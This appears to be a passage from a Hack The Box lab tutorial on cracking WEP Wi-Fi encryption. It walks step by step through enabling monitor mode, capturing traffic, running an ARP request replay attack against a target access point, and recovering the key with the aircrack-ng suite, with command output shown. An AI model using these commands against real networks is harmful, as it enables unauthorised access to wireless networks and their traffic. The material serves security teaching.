#### Enabling Monitor Mode

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

```sh
3kjS@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```
#### Performing the Attack

To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the name/path of our capture file with the `-w` argument.

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP
```

In a second terminal, we can launch the ARP request replay attack using `aireplay-ng`. We specify the ARP request replay attack mode with `-3`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. Once a valid ARP request is captured, the tool will replay it automatically.

```sh
3kjS@htb[/htb]$ sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon
```

Once we have generated enough ARP traffic, we can attempt to crack the key with `aircrack-ng`. We supply the `-b` option followed by our target BSSID, along with the `WEP-01.cap` file, where all the initialization vectors are stored.

```sh
3kjS@htb[/htb]$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Reading packets, please wait...
Opening WEP-01.cap
Read 195576 packets.

1 potential targets
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 IVs.
                     KEY FOUND! [ 33:44:55:22:11 ]
Attack Decrypted correctly: 100% captured IVs.
```

![](ARP%20Request%20Replay%20Attack-20260921-143239.png)
